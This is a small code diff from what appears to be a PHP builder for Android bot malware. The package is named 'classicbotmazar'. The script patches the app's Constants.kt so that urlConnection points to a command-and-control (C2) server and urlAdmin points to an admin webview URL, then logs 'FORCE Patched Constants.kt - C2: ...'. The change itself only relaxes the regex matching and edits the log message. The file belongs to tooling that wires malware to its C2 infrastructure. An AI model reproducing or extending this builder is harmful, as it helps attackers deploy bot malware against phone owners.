@@ -42,10 +42,10 @@ $constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Con
 if (file_exists($constFile)) {
     $c = file_get_contents($constFile);
     // Even more robust replacement with greedy matching for current values
-    $c = preg_replace('/val\s+urlConnection\s*=\s*".*?"/', 'val urlConnection = "' . $c2Url . '"', $c);
-    $c = preg_replace('/val\s+urlAdmin\s*=\s*".*?"/', 'val urlAdmin = "' . $webviewUrl . '"', $c);
+    $c = preg_replace('/urlConnection\s*=\s*".*?"/', 'urlConnection = "' . $c2Url . '"', $c);
+    $c = preg_replace('/urlAdmin\s*=\s*".*?"/', 'urlAdmin = "' . $webviewUrl . '"', $c);
     file_put_contents($constFile, $c);
-    sendLog("Patched Constants.kt - C2: $c2Url, Web: $webviewUrl");
+    sendLog("FORCE Patched Constants.kt - C2: $c2Url, Web: $webviewUrl");
 } else {
     sendLog("Error: Constants.kt not found at $constFile", ['success' => false]);
     exit;
